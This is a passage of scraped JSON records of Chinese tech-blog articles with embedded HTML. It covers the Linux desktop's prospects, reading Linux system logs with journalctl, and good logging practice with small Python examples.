桌面起家的红帽改变业务方向；</li>\n<li>没有标准的商业模式；</li>\n<li>缺乏硬件厂商支持</li>\n</ul>\n<p>身为乐观主义者的 Christian 还在文中表示，虽然 Linux 桌面目前的市场份额还没达到 10% ，但这并不意味着它不会发生。有别于专有软件，Linux 桌面的开源，意味着它非常难以被“杀”死。只要有一个强大的社区有兴趣推动它，它仍然前途无量。</p>\n<p>拿 “Year Of The Linux Desktop” 这句话去 Google 一下，我们会发现大量关于“Linux 桌面年”的相关信息，有些信息距今已将近 10 年。这意味着我们见证 10 年预言的同时，也见证了 10 年预言的破灭。</p>\n<p>所以要问“Linux 桌面年”何时会来？没人能给出准确答案。但是，目前我们能看到的是，在 Linux、Windows 或其他的什么系统共存和竞争的大环境下，身为普通用户的我们能够不断享受到竞争带来的创新，和越来越好的体验。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113361\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113361votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113361\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/dd1cc9aabc819ded578b6acfe94b7f995ee5ea2d.jpg"}
{"url_object_id": "cb06a4d36e47328f43948f73aae5d512", "title": "用系统日志了解你的 Linux 系统", "url": "http://blog.jobbole.com/113363/", "create_date": "2017/12/22", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/812cccb1d3c1ebac3ef67409d53aaa3d.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.suse.com/c/system-logs-understand-linux-system/\">SUSE</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9150-1.html\">Linux中国/DarkSun</a>   </div><p>本文摘自为 Linux 小白（或者非资深桌面用户）传授技巧的系列文章。该系列文章旨在为 LinuxMagazine 发布的第 30 期特别版 “<a href=\"http://www.linux-magazine.com/Resources/Special-Editions/30-Getting-Started-with-Linux\">Linux 入门</a>” （基于 <a href=\"https://en.opensuse.org/Portal:42.3\">openSUSE Leap</a> ）提供补充说明。</p>\n<p>本文作者是 Romeo S.，她是一名基于 PDX 的企业 Linux 专家，专注于为创新企业提供富有伸缩性的解决方案。</p>\n<p>Linux 系统日志非常重要。后台运行的程序（通常被称为守护进程或者服务进程）处理了你 Linux 系统中的大部分任务。当这些守护进程工作时，它们将任务的详细信息记录进日志文件中，作为它们做过什么的“历史”信息。这些守护进程的工作内容涵盖从使用原子钟同步时钟到管理网络连接。所有这些都被记录进日志文件，这样当有错误发生时，你可以通过查阅特定的日志文件来看出发生了什么。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/812cccb1d3c1ebac3ef67409d53aaa3d.jpg\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>Photo by Markus Spiske on Unsplash</em></p>\n<p>在你的 Linux 计算机上有很多不同的日志。历史上，它们一般以纯文本的格式存储到 <code>/var/log</code> 目录中。现在依然有很多日志这样做，你可以很方便的使用 <code>less</code> 来查看它们。</p>\n<p>在新装的 openSUSE Leap 42.3 以及大多数现代操作系统上，重要的日志由 <code>systemd</code> 初始化系统存储。 <code>systemd</code>这套系统负责启动守护进程，并在系统启动时让计算机做好被使用的准备。由 <code>systemd</code> 记录的日志以二进制格式存储，这使得它们消耗的空间更小，更容易被浏览，也更容易被导出成其他各种格式，不过坏处就是你必须使用特定的工具才能查看。好在这个工具已经预安装在你的系统上了：它的名字叫 <code>journalctl</code>，而且默认情况下，它会将每个守护进程的所有日志都记录到一个地方。</p>\n<p>只需要运行 <code>journalctl</code> 命令就能查看你的 <code>systemd</code> 日志了。它会用 <code>less</code> 分页器显示各种日志。为了让你有个直观的感受, 下面是 <code>journalctl</code> 中摘录的一条日志记录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc8d6de3205619607\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nJul 06 11:53:47 aaathats3as pulseaudio[2216]: [pulseaudio] alsa-util.c: Disabling timer-based scheduling because running inside a VM.\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc8d6de3205619607-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc8d6de3205619607-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc8d6de3205619607-1\"><span class=\"crayon-i\">Jul</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">06</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">53</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">47</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">aaathats3as </span><span class=\"crayon-v\">pulseaudio</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2216</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">pulseaudio</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">alsa</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">c</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Disabling </span><span class=\"crayon-v\">timer</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">based </span><span class=\"crayon-e\">scheduling </span><span class=\"crayon-e\">because </span><span class=\"crayon-e\">running </span><span class=\"crayon-i\">inside</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">VM</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8d6de3205619607-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>这条独立的日志记录以此包含了记录的日期和时间、计算机名、记录日志的进程名、记录日志的进程 PID，以及日志内容本身。</p>\n<p>若系统中某个程序运行出问题了，则可以查看日志文件并搜索（使用 <code>/</code> 加上要搜索的关键字）程序名称。有可能导致该程序出问题的错误会记录到系统日志中。 有时，错误信息会足够详细到让你能够修复该问题。其他时候，你需要在 Web 上搜索解决方案。 Google 就很适合来搜索奇怪的 Linux 问题。不过搜索时请注意你只输入了日志的实际内容，行首的那些信息（日期、主机名、进程 ID) 对搜索来说是无意义的，会干扰搜索结果。</p>\n<p>解决方法一般在搜索结果的前几个连接中就会有了。当然，你不能只是无脑得运行从互联网上找到的那些命令：请一定先搞清楚你要做的事情是什么，它的效果会是什么。据说，搜索系统日志中的特定条目要比直接描述该故障通用关键字要有用的多。因为程序出错有很多原因，而且同样的故障表现也可能由多种问题引发的。</p>\n<p>比如，系统无法发声的原因有很多，可能是播放器没有插好，也可能是声音系统出故障了，还可能是缺少合适的驱动程序。如果你只是泛泛的描述故障表现，你会找到很多无关的解决方法，而你也会浪费大量的时间。而专门搜索日志文件中的实际内容，你也许会查询出其它人也有相同日志内容的结果。</p>\n<p>你可以对比一下图 1 和图 2。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/d3eed31f44df624aa333855bb658e12b.png\" alt=\"\"></p>\n<p style=\"text-align: center\">图 1 搜索系统的故障表现只会显示泛泛的，不精确的结果。这种搜索通常没什么用。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/4610a872c4bf145821d14f805ee95ace.png\" alt=\"\"></p>\n<p style=\"text-align: center\">图 2 搜索特定的日志行会显示出精确的，有用的结果。这种搜索通常很有用。</p>\n<p>也有一些系统不用 <code>journalctl</code> 来记录日志。在桌面系统中最常见的这类日志包括用于记录 openSUSE 包管理器的行为的 <code>/var/log/zypper.log</code>； 记录系统启动时消息的 <code>/var/log/boot.log</code> ，开机时这类消息往往滚动的特别快，根本看不过来；<code>/var/log/ntp</code> 用来记录 Network Time Protocol （NTP）守护进程同步时间时发生的错误。 另一个存放硬件故障信息的地方是 “Kernel Ring Buffer”（内核环状缓冲区），你可以输入 <code>demesg -H</code> 命令来查看（这条命令也会调用 <code>less</code> 分页器来查看）。“Kernel Ring Buffer” 存储在内存中，因此会在重启电脑后丢失。不过它包含了 Linux 内核中的重要事件，比如新增了硬件、加载了模块，以及奇怪的网络错误.</p>\n<p>希望你已经准备好深入了解你的 Linux 系统了! 祝你玩的开心!</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113363\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113363votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113363\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/2561f1d80bb5f24ecd600a61944033b80834f163.jpg"}
{"url_object_id": "ca3846b5e25e9357415c9c823f73b25b", "title": "日志的艺术（The art of logging）", "url": "http://blog.jobbole.com/113413/", "create_date": "2018/01/02", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/e35c32748c5bfe52651ccc7d9338d0da.png"], "praise_nums": 2, "comment_nums": 3, "favor_nums": 10, "tags": "IT技术,logging,日志", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/xybaby/p/7954610.html\">xybaby</a>   </div><p>程序员学习每一门语言都是从打印“hello world”开始的，日志也是新手程序员学习、调试程序的一大利器。当项目上线之后，也会有各种各样的日志，比如记录用户的行为、服务器的状态、异常情况等等。打印日志似乎是一件很简单、不值得一提的事情。但是，当看到线上项目居然有这样的日志的时候，不禁想问问我们真的会打印日志吗？</p>\n<blockquote><p>***********************************</p>\n<p>Error Happened, F*ck</p>\n<p>User xxx can not login</p></blockquote>\n<p>在我看来，打印日志是一门艺术，而且长期被程序员所忽视，本文尝试回答以下几个问题，分享我对打印日志的一些思考：</p>\n<p>(1) why or when to log</p>\n<p>(2) what to log</p>\n<p>(3) how to log and tips</p>\n<p>注意：本文中会用<strong>“打印”</strong>日志来统一表示日志的输出，但不是我们狭义理解的输出到终端或者stdout、stderr， 而是泛指将日志内容输出到任何目标，包括但不限于终端、文件、网络传输。</p>\n<h1>why or when to log</h1>\n<p>为什么时候要打印日志，或者什么时候打印日志，在我看来是同一个问题，那就是打印日志的目的。不同的目的，决定了日志内容的格式，输出的频度，输出的目的地。那可能有哪些打印日志的原因？</p>\n<p>（1）调试开发</p>\n<p>目的是开发期调试程序使用，这种日志量比较大，且没有什么实质性的意义，只应该出现在开发期，而不应该在项目上线之后输出。如何控制这种类型的日志是否输出，后面也会详细讨论。</p>\n<p>（2）用户行为日志</p>\n<p>这种类型的日志，记录用户的操作行为，用于大数据分析，比如监控、风控、推荐等等。这种日志，一般是给其他团队分析使用，而且可能是多个团队，因此一般会有一定的格式要求，开发者应该按照这个格式来记录，便于其他团队的使用。当然，要记录哪些行为、操作，一般也是约定好的，因此，开发者主要是执行的角色。</p>\n<p>（3）程序运行日志</p>\n<p>记录程序的运行状况，特别是非预期的行为、异常情况，这种日志，主要是给开发、维护人员使用。什么时候记录，记录什么内容，完全取决于开发人员，开发者具有高度自主性。本文讨论的主要也是指这种类型的日志，因为作为一个服务端开发、运维人员，程序运行日志往往是解决线上问题的救命稻草。</p>\n<p>（4）记录系统或者机器的状态</p>\n<p>比如网络请求、系统CPU、内存、IO使用情况等等，这种日志主要是给运维人员使用，生成各种更直观的展现形式，在系统出问题的时候报警。</p>\n<h1>what to log</h1>\n<p>一条日志要包含哪些内容，我觉的应该包含 when、where、how、what、who、context，具体含义会在下面一个小节介绍。</p>\n<p>我们要记录日志，总是要在某个时机，比如用户的某个请求、某个网络调用、或者内部状态发生了改变。在后文中，统称为事件（event），即日志内容是对某个事件的描述。</p>\n<h2>when: the time event happens</h2>\n<p>when，就是我们打印日志的时间（时间戳），注意这里的时间指的是日志记录的事件的发生时间，而不是日志被最终输出的时间。比如如果日志的输出目标是文件，那么这里的when不是写入到文件的时间，因为往往有延迟。</p>\n<p>时间的重要性，在《<a href=\"http://book.mixu.net/distsys/time.html\" target=\"_blank\">Distributed systems for fun and profit</a>》中有很好的讲述。</p>\n<p>首先，时间可以被解读（Interpretaion）成具体的、现实的日期，让我们可以知道事件发生时的时间环境，比如出问题的时候是不是有什么活动、结合系统日志分析当时服务器的网络、CPU、IO是怎么样。具体的时间点也可以帮助我们分析事件的发生是不是存在某种规律，比如是不是每天、每周、每月的固定时间点都会出问题。</p>\n<p>其次，时间可以表示一个（一组）事件的持续时间（duration）。比如，可以监控处一段代码的执行时间，也可以记录一个网络请求的耗时。这个时间差也能给出我们很多信息，比如根据经验预判当时程序的运行状态，是否比较‘卡’。</p>\n<p>最后，时间代表了事件发生的顺序（order），我们将多个日志按照时间排序，这个顺序能帮助我们debug到底问题是怎么产生的，是按照什么样的时序。这对于多进程（多线程）、异步、分布式程序而言非常重要。虽然我们知道在分布式系统维护全局的时间（global clock）是很复杂的一件事情，但我们使用NTP协议，基本上能解决大部分的问题。</p>\n<h2>where: where the event happens</h2>\n<p>where，就是指日志是在哪里的被记录的，本质上来说，是事件的产生地点。根据情况，可以具体到是哪个模块、哪个文件，甚至是哪一个函数、哪一行代码。实践告知，至少应该包含模块信息。</p>\n<p>where的意义在于能够让自己或者其他程序员一眼就看出这条日志是在哪里产生的，这样就能大致定位问题处在哪里，而不用从日志内容全局grep代码</p>\n<h2>how：how importance of the event</h2>\n<p>how important，代表了事件的重要性，我们会打印很多各种类型的日志，但是不同的日志的重要性是不一样的。比如，调试日志是最不重要的，是不应该出现在线上项目的，但是程序运行报错日志却需要认真对待，因为代表程序已经出现了异常。即使是程序的报错日志，也有不同的紧急程度，一次网络请求超时跟子进程异常退出份量完全不一样。</p>\n<p>因此，每一条日志都应该有log level，log level代表了日志的重要性、紧急程度。不同的语言、框架的level细分有一定的差异，但都会包括debug，info，warn，error，fatal（critical）。其重要程度从名字就可以看出。</p>\n<p>当然，有时候，warn与error，或者error与fatal之间的界限不那么明显，这个需要在团队之间达成共识。在我们的线上项目，对于error、fatal级别的日志都会报警，如果出现了error日志，那么最迟需要第二天去处理，如果是fatal日志，即使是在大半夜，也得立刻起来分析、处理。</p>\n<h2>what：what is the log message</h2>\n<p>what是日志的主体内容，应该简明扼要的描述发生的什么事情。要求可以通过日志本身，而不是重新阅读产生日志的代码，来大致搞清楚发生了什么事情。所以，下面这个日志是不合格的：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63511bc2b71146765003\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    if not valid_username(username):\r\n        logger.warn('Error Happened')\r\n        return\r\n    # some others code</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b71146765003-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b71146765003-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b71146765003-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b71146765003-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b71146765003-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63511bc2b71146765003-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b71146765003-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_username</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b71146765003-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Error Happened'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b71146765003-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b71146765003-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some others code</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n\n</div>\n<p>是的，我知道，出了问题了，但是日志应该告诉我出了什么问题，所以日志至少应该是这样的：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63511bc2b7c852364464\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    if not valid_username(username):\r\n        logger.warn('user_login failed due to unvalid_username')\r\n        return\r\n    # some others code</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b7c852364464-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b7c852364464-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b7c852364464-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b7c852364464-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b7c852364464-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63511bc2b7c852364464-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b7c852364464-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_username</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b7c852364464-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'user_login failed due to unvalid_username'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b7c852364464-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b7c852364464-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some others code</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n\n</div>\n<h2>who：the uniq identify</h2>\n<p>who代表了事件产生者的唯一标识（identity），用于区分同样的事件。特别是在服务器端，都是大量用户、请求的并发，如果日志内容不包含唯一标识信息，那么这条日志就会淹没在茫茫大海中，比如下面这条日志：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63511bc2b80396436306\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" 